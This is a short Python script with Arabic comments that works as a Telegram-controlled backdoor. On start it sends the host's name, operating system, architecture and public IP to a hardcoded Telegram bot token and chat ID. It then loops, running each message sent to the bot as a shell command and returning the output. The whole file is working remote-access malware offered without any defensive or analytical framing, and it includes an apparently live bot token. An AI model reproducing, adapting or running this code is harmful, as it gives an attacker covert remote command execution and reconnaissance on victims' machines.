import os
import platform
import socket
import requests
import subprocess

# إعدادات البوت
TOKEN = '7921552607:AAHer0Wkg0xOGrhKtuVq9KZyzJRFOjQUPvQ'
CHAT_ID = '6808756378'

# إرسال رسالة إلى البوت
def send(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': msg}
    try:
        requests.post(url, data=data)
    except:
        pass

# إرسال معلومات النظام
def send_system_info():
    info = f"""[🖥 معلومات الخادم]
🌐 Hostname: {socket.gethostname()}
🖥 OS: {platform.system()} {platform.release()}
📦 Arch: {platform.machine()}
🔍 IP: {requests.get("https://api.ipify.org").text}
"""
    send(info)

# تنفيذ الأوامر من البوت
def check_commands():
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    last_command = ""
    while True:
        try:
            r = requests.get(url).json()
            commands = r['result']
            if commands:
                last = commands[-1]
                text = last['message']['text']
                if text != last_command:
                    last_command = text
                    try:
                        output = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT)
                        send(f"[✅ نتيجة الأمر]\n{text}\n\n{output.decode()}")
                    except subprocess.CalledProcessError as e:
                        send(f"[❌ خطأ في تنفيذ الأمر]\n{e.output.decode()}")
        except:
            pass

# التنفيذ
send_system_info()
check_commands()